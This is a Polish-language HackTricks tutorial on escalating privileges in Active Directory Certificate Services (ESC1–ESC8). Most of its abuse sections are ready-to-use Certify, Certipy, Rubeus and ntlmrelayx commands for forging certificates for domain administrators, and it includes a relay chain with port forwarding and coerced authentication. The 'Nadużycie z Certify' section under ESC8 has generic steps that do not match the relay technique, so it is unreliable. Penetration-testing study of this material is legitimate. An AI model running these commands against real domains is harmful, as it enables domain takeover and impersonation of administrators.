# AD CS Eskalacja domeny

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

**To jest podsumowanie sekcji technik eskalacji:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Błędnie skonfigurowane szablony certyfikatów - ESC1 Wyjaśnione

* **Uprawnienia do zapisu są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.**
* **Nie jest wymagane zatwierdzenie przez kierownika.**
* **Nie są wymagane podpisy od upoważnionego personelu.**
* **Deskryptory zabezpieczeń na szablonach certyfikatów są nadmiernie liberalne, umożliwiając użytkownikom o niskich uprawnieniach uzyskanie uprawnień do zapisu.**
* **Szablony certyfikatów są skonfigurowane w celu zdefiniowania EKU ułatwiających uwierzytelnianie:**
* Dołączone są identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
* **Szablon certyfikatu umożliwia wnioskodawcom dołączenie subjectAltName w żądaniu podpisania certyfikatu (CSR):**
* W Active Directory (AD) priorytetowo traktowany jest subjectAltName (SAN) w certyfikacie do weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że poprzez określenie SAN w CSR można zażądać certyfikatu, który będzie udawał dowolnego użytkownika (np. administratora domeny). Czy wnioskodawca może określić SAN jest wskazane w obiekcie AD szablonu certyfikatu za pomocą właściwości `mspki-certificate-name-flag`. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` umożliwia wnioskodawcy określenie SAN.

{% hint style="danger" %}
Opisana konfiguracja umożliwia użytkownikom o niskich uprawnieniach żądanie certyfikatów z dowolnym wybranym SAN, umożliwiając uwierzytelnianie jako dowolny podmiot domeny za pomocą protokołu Kerberos lub SChannel.
{% endhint %}

Ta funkcja jest czasami włączana w celu obsługi dynamicznej generacji certyfikatów HTTPS lub hosta przez produkty lub usługi wdrożeniowe, lub z powodu braku zrozumienia.

Zauważono, że utworzenie certyfikatu z tą opcją powoduje wygenerowanie ostrzeżenia, czego nie dotyczy w przypadku duplikowania istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, w którym jest włączona flaga `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) i następnie zmodyfikowania go w celu uwzględnienia OID uwierzytelniania.

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, można uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę podatność do podszywania się pod administratora**, można uruchomić:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go do **uwierzytelniania za pomocą Rubeusa lub certipy** ponownie:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaria systemu Windows "Certreq.exe" i "Certutil.exe" mogą być używane do generowania pliku PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracja szablonów certyfikatów w schemacie konfiguracji lasu AD, szczególnie tych, które nie wymagają zatwierdzenia ani podpisów, posiadających EKU uwierzytelniania klienta lub logowania kartą inteligentną oraz z włączoną flagą `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, może być wykonana poprzez uruchomienie następującego zapytania LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Źle skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariacją pierwszego:

1. Uprawnienia do rejestracji są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.
2. Wyłączono wymaganie zgody kierownika.
3. Pominięto konieczność autoryzowanych podpisów.
4. Zbyt liberalny deskryptor zabezpieczeń na szablonie certyfikatu przyznaje użytkownikom o niskich uprawnieniach uprawnienia do rejestracji certyfikatów.
5. **Szablon certyfikatu jest zdefiniowany tak, aby zawierał dowolne EKU (Any Purpose EKU) lub nie zawierał żadnego EKU.**

**Any Purpose EKU** pozwala na uzyskanie certyfikatu przez atakującego do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itp. Można zastosować **tę samą technikę co w przypadku ESC3**, aby wykorzystać ten scenariusz.

Certyfikaty **bez EKU**, które działają jako certyfikaty podrzędne CA, mogą być wykorzystane do **dowolnego celu** i **również do podpisywania nowych certyfikatów**. Atakujący może więc określić dowolne EKU lub pola w nowych certyfikatach, korzystając z certyfikatu podrzędnego CA.

Jednak nowe certyfikaty utworzone do **uwierzytelniania domeny** nie będą działać, jeśli certyfikat podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest domyślnym ustawieniem. Niemniej jednak atakujący wciąż może tworzyć **nowe certyfikaty z dowolnym EKU** i arbitralnymi wartościami certyfikatu. Mogą one potencjalnie być **nadużywane** w celu szerokiego zakresu zastosowań (np. podpisywania kodu, uwierzytelniania serwera itp.) i mogą mieć poważne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.

Aby wyliczyć szablony pasujące do tego scenariusza w konfiguracji schematu AD Forest, można uruchomić następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Źle skonfigurowane szablony agenta rejestracji - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** **inne EKU** (Agent żądania certyfikatu) i **2 różne szablony** (dlatego ma 2 zestawy wymagań).

EKU (OID 1.3.6.1.4.1.311.20.2.1) o nazwie **Agent rejestracji** w dokumentacji Microsoftu, umożliwia podmiotowi **zarejestrowanie** się w celu **uzyskania certyfikatu** w **imieniu innego użytkownika**.

**"Agent rejestracji"** rejestruje się w takim **szablonie** i używa wynikowego **certyfikatu do współpodpisywania CSR w imieniu innego użytkownika**. Następnie **wysyła** współpodpisany CSR do CA, rejestrując się w **szablonie**, który **umożliwia "rejestrację w imieniu"**, a CA odpowiada certyfikatem należącym do **"innego" użytkownika**.

**Wymagania 1:**

- Uprawnienia do rejestracji są przyznawane użytkownikom o niskich uprawnieniach przez Enterprise CA.
- Pominięto wymaganie zgody kierownika.
- Brak wymogu autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny, przyznając uprawnienia do rejestracji użytkownikom o niskich uprawnieniach.
- Szablon certyfikatu zawiera EKU Agent żądania certyfikatu, umożliwiający żądanie innych szablonów certyfikatów w imieniu innych podmiotów.

**Wymagania 2:**

- Enterprise CA przyznaje uprawnienia do rejestracji użytkownikom o niskich uprawnieniach.
- Pominięto wymóg zgody kierownika.
- Wersja schematu szablonu to 1 lub przekracza 2, a określa on wymaganie wydawania certyfikatów zgodnie z polityką aplikacji, której wymagana jest EKU Agent żądania certyfikatu.
- EKU zdefiniowane w szablonie certyfikatu umożliwia uwierzytelnianie domeny.
- Ograniczenia dla agentów rejestracji nie są stosowane w CA.

### Nadużycie

Możesz wykorzystać [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Użytkownicy**, którzy mają **uprawnienia** do **uzyskania** certyfikatu **agenta rejestracji**, szablony, w których agenci rejestracji mają prawo do rejestracji, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczone przez CA przedsiębiorstwa. Można to osiągnąć, otwierając `certsrc.msc` **snap-in**, **klikając prawym przyciskiem myszy na CA**, **klikając właściwości**, a następnie **przechodząc** do zakładki "Agenci rejestracji".

Jednak zauważono, że **domyślne** ustawienie dla CA to "Nie ograniczaj agentów rejestracji". Gdy ograniczenie agentów rejestracji jest włączone przez administratorów, ustawienie go na "Ogranicz agentów rejestracji", domyślna konfiguracja pozostaje nadal bardzo liberalna. Pozwala to **Wszystkim** na dostęp do rejestracji we wszystkich szablonach jako ktokolwiek.

## Podatne na eskalację uprawnień szablony certyfikatów - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** na **szablonach certyfikatów** definiuje **uprawnienia** określonych **podmiotów AD** dotyczące szablonu.

Jeśli **atakujący** posiada odpowiednie **uprawnienia** do **zmiany** szablonu i **wprowadzenia** jakichkolwiek **wykorzystywalnych błędów konfiguracyjnych** opisanych w **poprzednich sekcjach**, może ułatwić eskalację uprawnień.

Należy zwrócić uwagę na następujące uprawnienia dotyczące szablonów certyfikatów:

- **Właściciel:** Zapewnia niejawną kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **Pełna kontrola:** Zapewnia pełną władzę nad obiektem, w tym możliwość zmiany dowolnych atrybutów.
- **Zapisz właściciela:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez atakującego.
- **Zapisz Dacl:** Umożliwia dostosowanie kontroli dostępu, potencjalnie przyznając atakującemu pełną kontrolę.
- **Zapisz właściwość:** Uprawnia do edycji dowolnych właściwości obiektu.

### Wykorzystanie

Przykład eskalacji uprawnień podobnej do poprzedniej:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia do zapisu na szablonie certyfikatu. Może to na przykład być wykorzystane do nadpisania konfiguracji szablonu certyfikatu, aby uczynić go podatnym na ESC1.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowe połączenie `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika dotyczy certyfikatów, zaimplementowałem również ten atak, który jest znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto mały podgląd polecenia `shadow auto` w Certipy do pobrania skrótu NT ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą jednej komendy. Domyślnie Certipy nadpisze konfigurację, aby uczynić ją podatną na ESC1. Możemy również określić parametr `-save-old`, aby zapisać starą konfigurację, co będzie przydatne do przywrócenia konfiguracji po ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Podatne sterowanie dostępem do obiektów PKI - ESC5

### Wyjaśnienie

Rozległa sieć powiązań oparta na kontrolach dostępu (ACL), która obejmuje wiele obiektów poza szablonami certyfikatów i autorytetem certyfikującym, może wpływać na bezpieczeństwo całego systemu AD CS. Te obiekty, które mogą znacząco wpływać na bezpieczeństwo, obejmują:

* Obiekt komputera AD serwera CA, który może zostać skompromitowany za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
* Serwer RPC/DCOM serwera CA.
* Dowolny potomny obiekt AD lub kontener w określonej ścieżce kontenera `CN=Usługi klucza publicznego,CN=Usługi,CN=Konfiguracja,DC=<DOMAIN>,DC=<COM>`. Ta ścieżka obejmuje, ale nie jest ograniczona do, kontenerów i obiektów takich jak kontener Szablony certyfikatów, kontener Autorytety certyfikujące, obiekt NTAuthCertificates i kontener Usługi certyfikacyjne.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli nisko uprzywilejowany atakujący zdobędzie kontrolę nad którymkolwiek z tych kluczowych komponentów.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omawiany w [**wpisie CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) dotyczy również implikacji flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, jak określone przez firmę Microsoft. Ta konfiguracja, gdy jest aktywowana na Autorytecie Certyfikującym (CA), umożliwia uwzględnienie **wartości zdefiniowanych przez użytkownika** w **alternatywnym polu nazwy podmiotu** dla **każdego żądania**, w tym tych konstruowanych z Active Directory®. W rezultacie intruz może zarejestrować się za pomocą **dowolnego szablonu** skonfigurowanego dla **uwierzytelniania** domeny - w szczególności tych otwartych dla rejestracji przez **nieważne** użytkowniki, takich jak standardowy szablon Użytkownika. W rezultacie można zabezpieczyć certyfikat, umożliwiając intruzowi uwierzytelnienie jako administrator domeny lub **dowolnej innej aktywnej jednostki** w domenie.

**Uwaga**: Sposób dodawania **alternatywnych nazw** do żądania certyfikatu (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (nazywanego "Pary nazwa-wartość") różni się od strategii wykorzystania SAN w ESC1. Tutaj różnica polega na **enkapsulacji informacji o koncie** - w atrybucie certyfikatu, a nie w rozszerzeniu.

### Wykorzystanie

Aby sprawdzić, czy ustawienie jest aktywowane, organizacje mogą skorzystać z następującego polecenia z użyciem `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja wykorzystuje głównie **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) są zdolne do wykrywania tej nieprawidłowej konfiguracji i jej wykorzystania:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się uprawnienia **administratora domeny** lub równoważne, można wykonać następujące polecenie z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Po aktualizacjach zabezpieczeń z maja 2022 roku, nowo wydane **certyfikaty** będą zawierać **rozszerzenie zabezpieczeń**, które uwzględnia **właściwość `objectSid` zgłaszającego żądanie**. Dla ESC1, SID ten jest pochodną określonego SAN. Jednak dla **ESC6**, SID odzwierciedla **`objectSid` zgłaszającego żądanie**, a nie SAN.\
Aby wykorzystać ESC6, konieczne jest, aby system był podatny na ESC10 (Słabe mapowania certyfikatów), który priorytetowo traktuje **SAN ponad nowym rozszerzeniem zabezpieczeń**.
{% endhint %}

## Podatne sterowanie dostępem do certyfikatu CA - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do certyfikatu CA jest utrzymywana za pomocą zestawu uprawnień, które regulują działania CA. Te uprawnienia można zobaczyć, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy na CA, wybierając właściwości, a następnie przechodząc do zakładki Zabezpieczenia. Dodatkowo, uprawnienia można wyliczyć za pomocą modułu PSPKI za pomocą poleceń, takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
To dostarcza informacji na temat podstawowych uprawnień, a mianowicie **`ManageCA`** i **`ManageCertificates`**, które korelują z rolami "administratora CA" i "menedżera certyfikatów" odpowiednio.

#### Nadużycie

Posiadanie uprawnień **`ManageCA`** w certyfikacie umożliwia podmiotowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, aby umożliwić określanie SAN w dowolnym szablonie, co jest istotnym aspektem eskalacji domeny.

Uproszczenie tego procesu jest osiągalne dzięki użyciu polecenia **Enable-PolicyModuleFlag** w PSPKI, co pozwala na modyfikacje bez bezpośredniej interakcji z interfejsem graficznym.

Posiadanie uprawnień **`ManageCertificates`** ułatwia zatwierdzanie oczekujących żądań, umożliwiając obejście zabezpieczenia "zatwierdzenie przez menedżera certyfikatów CA".

Kombinacja modułów **Certify** i **PSPKI** może być wykorzystana do żądania, zatwierdzania i pobierania certyfikatu:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

{% hint style="warning" %}
W **poprzednim ataku** wykorzystano uprawnienia **`Manage CA`** do **włączenia** flagi **EDITF\_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia ataku **ESC6**, ale nie będzie to miało żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie uruchomiona ponownie. Gdy użytkownik ma prawo dostępu `Manage CA`, ma również prawo do **ponownego uruchomienia usługi**. Jednak nie oznacza to, że użytkownik może uruchomić usługę zdalnie. Ponadto, **ESC6 może nie działać domyślnie** w większości zaktualizowanych środowisk ze względu na aktualizacje zabezpieczeń z maja 2022 roku.
{% endhint %}

Dlatego tutaj przedstawiony jest kolejny atak.

Wymagania wstępne:

* Tylko uprawnienie **`ManageCA`**
* Uprawnienie **`Manage Certificates`** (może być przyznane z uprawnienia **`ManageCA`**)
* Szablon certyfikatu **`SubCA`** musi być **włączony** (może być włączony z uprawnienia **`ManageCA`**)

Technika polega na tym, że użytkownicy posiadający prawo dostępu `Manage CA` _i_ `Manage Certificates` mogą **wystawiać nieudane żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale **tylko administratorzy** mogą się zapisać do tego szablonu. Dlatego **użytkownik** może **złożyć żądanie** zapisu do **`SubCA`** - które zostanie **odrzucone** - ale **następnie zostanie wydane przez menedżera**.

#### Nadużycie

Możesz **przyznać sobie uprawnienie `Manage Certificates`** dodając swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne dla tego ataku, możemy rozpocząć od **żądania certyfikatu opartego na szablonie `SubCA`**.

**To żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zapiszemy identyfikator żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Z naszymi **`Zarządzaj CA` i `Zarządzaj Certyfikatami`**, możemy następnie **wydać nieudane żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <ID żądania>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I w końcu możemy **pobrać wydany certyfikat** za pomocą polecenia `req` i parametru `-retrieve <ID żądania>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay do punktów końcowych HTTP AD CS - ESC8

### Wyjaśnienie

{% hint style="info" %}
W środowiskach, w których zainstalowany jest **AD CS**, jeśli istnieje podatny **punkt końcowy do rejestracji przez sieć web** i co najmniej jeden **szablon certyfikatu jest opublikowany**, który umożliwia **rejestrację komputera domenowego i uwierzytelnianie klienta** (takiego jak domyślny szablon **`Machine`**), staje się możliwe, że **dowolny komputer z aktywną usługą drukowania może zostać skompromitowany przez atakującego**!
{% endhint %}

AD CS obsługuje kilka **metod rejestracji opartych na protokole HTTP**, dostępnych poprzez dodatkowe role serwera, które administratorzy mogą zainstalować. Interfejsy te do rejestracji certyfikatów oparte na protokole HTTP są podatne na **ataki NTLM relay**. Atakujący, z **skompromitowanego komputera, może podszywać się pod dowolne konto AD, które uwierzytelnia się za pomocą przychodzącego NTLM**. Podszywając się pod konto ofiary, atakujący może uzyskać dostęp do tych interfejsów webowych, aby **poprosić o certyfikat uwierzytelniania klienta, używając szablonów certyfikatów `User` lub `Machine`**.

* Interfejs **rejestracji przez sieć web** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`) domyślnie obsługuje tylko protokół HTTP, który nie zapewnia ochrony przed atakami NTLM relay. Ponadto, wyraźnie zezwala tylko na uwierzytelnianie NTLM za pomocą nagłówka HTTP Authorization, co uniemożliwia stosowanie bardziej bezpiecznych metod uwierzytelniania, takich jak Kerberos.
* Usługa **Rejestracji Certyfikatów** (CES), **Usługa Sieciowej Polityki Rejestracji Certyfikatów** (CEP) i **Usługa Rejestracji Urządzeń Sieciowych** (NDES) domyślnie obsługują uwierzytelnianie negocjowane za pomocą nagłówka HTTP Authorization. Uwierzytelnianie negocjowane **obsługuje zarówno** Kerberos, jak i **NTLM**, umożliwiając atakującemu **zmniejszenie poziomu uwierzytelniania do NTLM** podczas ataków relay. Chociaż te usługi webowe domyślnie obsługują protokół HTTPS, samo HTTPS **nie chroni przed atakami NTLM relay**. Ochrona przed atakami NTLM relay dla usług HTTPS jest możliwa tylko wtedy, gdy HTTPS jest połączone z wiązaniem kanału. Niestety, AD CS nie aktywuje rozszerzonej ochrony uwierzytelniania w IIS, która jest wymagana do wiązania kanałów.

Powszechnym **problemem** z atakami NTLM relay jest **krótki czas trwania sesji NTLM** i niemożność atakującego do interakcji z usługami, które **wymagają podpisu NTLM**.

Jednak to ograniczenie jest pokonywane poprzez wykorzystanie ataku NTLM relay do uzyskania certyfikatu dla użytkownika, ponieważ okres ważności certyfikatu określa czas trwania sesji, a certyfikat można używać z usługami, które **wymagają podpisu NTLM**. Instrukcje dotyczące wykorzystania skradzionego certyfikatu znajdują się tutaj:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Innym ograniczeniem ataków NTLM relay jest to, że **maszyna kontrolowana przez atakującego musi być uwierzytelniona przez konto ofiary**. Atakujący może albo czekać, albo próbować **wymusić** to uwierzytelnienie:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Wykorzystanie**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` wylicza **włączone punkty końcowe HTTP AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez przedsiębiorstwa do przechowywania punktów końcowych usługi rejestracji certyfikatów (CES) przez CAs (Certyfikujące Organizacje). Te punkty końcowe mogą być analizowane i wyświetlane za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Nadużycie z Certify

Certify to narzędzie, które może być wykorzystane do eskalacji uprawnień w domenie Active Directory poprzez nadużycie certyfikatów. Ten atak polega na wykorzystaniu uprawnień do zarządzania certyfikatami w celu uzyskania dostępu do innych kont użytkowników.

Aby przeprowadzić atak, należy:

1. Zainstalować i skonfigurować Certify na maszynie atakującej.
2. Wygenerować certyfikat dla konta użytkownika, które chcemy zaatakować.
3. Zainstalować wygenerowany certyfikat na maszynie atakującej.
4. Uruchomić narzędzie Certify i wybrać zainstalowany certyfikat.
5. Wybrać opcję "Request Certificate" i podać informacje o koncie użytkownika, którego certyfikat chcemy uzyskać.
6. Po zatwierdzeniu żądania, Certify wygeneruje nowy certyfikat dla wybranego konta użytkownika.
7. Zainstalować nowy certyfikat na maszynie atakującej.
8. Uzyskać dostęp do konta użytkownika, korzystając z nowego certyfikatu.

Ten atak jest skuteczny, gdy atakujący ma uprawnienia do zarządzania certyfikatami w domenie Active Directory. Dlatego ważne jest, aby odpowiednio zabezpieczyć te uprawnienia i monitorować wszelkie podejrzane aktywności związane z zarządzaniem certyfikatami.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Nadużycie z [Certipy](https://github.com/ly4k/Certipy)

Domyślnie, Certipy wysyła żądanie o certyfikat na podstawie szablonu `Machine` lub `User`, co jest określane na podstawie tego, czy nazwa konta kończy się na `$`. Możliwe jest określenie alternatywnego szablonu za pomocą parametru `-template`.

